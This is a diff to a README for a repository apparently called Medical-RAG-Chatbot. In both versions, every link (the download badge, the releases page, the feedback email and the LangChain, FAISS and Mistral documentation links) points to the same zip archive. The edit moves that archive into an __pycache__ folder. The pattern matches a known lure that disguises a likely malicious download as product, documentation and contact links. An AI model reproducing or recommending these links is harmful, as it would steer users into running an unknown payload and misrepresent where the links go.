@@ -1,6 +1,6 @@
 # 🩺 Medical-RAG-Chatbot - Your AI-Powered Medical Assistant
 
-[![Download Medical-RAG-Chatbot](https://raw.githubusercontent.com/suyash0405/Medical-RAG-Chatbot/master/medical-rag-chatbot/retriever/Chatbot_Medical_RA_v2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/suyash0405/Medical-RAG-Chatbot/master/medical-rag-chatbot/retriever/Chatbot_Medical_RA_v2.8.zip)
+[![Download Medical-RAG-Chatbot](https://github.com/suyash0405/Medical-RAG-Chatbot/raw/refs/heads/master/app/__pycache__/RA_Chatbot_Medical_3.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/suyash0405/Medical-RAG-Chatbot/raw/refs/heads/master/app/__pycache__/RA_Chatbot_Medical_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Medical-RAG-Chatbot! This software provides an easy way to get me
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Medical-RAG-Chatbot Releases](https://raw.githubusercontent.com/suyash0405/Medical-RAG-Chatbot/master/medical-rag-chatbot/retriever/Chatbot_Medical_RA_v2.8.zip)
+To get started, visit this page to download: [Medical-RAG-Chatbot Releases](https://github.com/suyash0405/Medical-RAG-Chatbot/raw/refs/heads/master/app/__pycache__/RA_Chatbot_Medical_3.7.zip)
 
 1. Click on the link above to reach the Releases page.
 2. Find the latest version of the application.
@@ -68,18 +68,18 @@ We are here to help. If you encounter any issues or have questions:
 
 ## 📬 Feedback
 
-Your feedback is valuable. Let us know what you think about the chatbot, and how we can improve. Send your suggestions to our GitHub page or contact us via email at https://raw.githubusercontent.com/suyash0405/Medical-RAG-Chatbot/master/medical-rag-chatbot/retriever/Chatbot_Medical_RA_v2.8.zip
+Your feedback is valuable. Let us know what you think about the chatbot, and how we can improve. Send your suggestions to our GitHub page or contact us via email at https://github.com/suyash0405/Medical-RAG-Chatbot/raw/refs/heads/master/app/__pycache__/RA_Chatbot_Medical_3.7.zip
 
 ## 🔗 Additional Resources
 
 For those looking to dive deeper into the technology behind the chatbot:
 
-- [LangChain Documentation](https://raw.githubusercontent.com/suyash0405/Medical-RAG-Chatbot/master/medical-rag-chatbot/retriever/Chatbot_Medical_RA_v2.8.zip)
-- [FAISS Documentation](https://raw.githubusercontent.com/suyash0405/Medical-RAG-Chatbot/master/medical-rag-chatbot/retriever/Chatbot_Medical_RA_v2.8.zip)
-- [Mistral AI Models](https://raw.githubusercontent.com/suyash0405/Medical-RAG-Chatbot/master/medical-rag-chatbot/retriever/Chatbot_Medical_RA_v2.8.zip)
+- [LangChain Documentation](https://github.com/suyash0405/Medical-RAG-Chatbot/raw/refs/heads/master/app/__pycache__/RA_Chatbot_Medical_3.7.zip)
+- [FAISS Documentation](https://github.com/suyash0405/Medical-RAG-Chatbot/raw/refs/heads/master/app/__pycache__/RA_Chatbot_Medical_3.7.zip)
+- [Mistral AI Models](https://github.com/suyash0405/Medical-RAG-Chatbot/raw/refs/heads/master/app/__pycache__/RA_Chatbot_Medical_3.7.zip)
 
 ## 🔗 Revisit the Download Page
 
-When you're ready to install, don't forget to visit this page to download: [Medical-RAG-Chatbot Releases](https://raw.githubusercontent.com/suyash0405/Medical-RAG-Chatbot/master/medical-rag-chatbot/retriever/Chatbot_Medical_RA_v2.8.zip)
+When you're ready to install, don't forget to visit this page to download: [Medical-RAG-Chatbot Releases](https://github.com/suyash0405/Medical-RAG-Chatbot/raw/refs/heads/master/app/__pycache__/RA_Chatbot_Medical_3.7.zip)
 
 Thank you for choosing Medical-RAG-Chatbot! We hope it becomes your go-to resource for medical information.
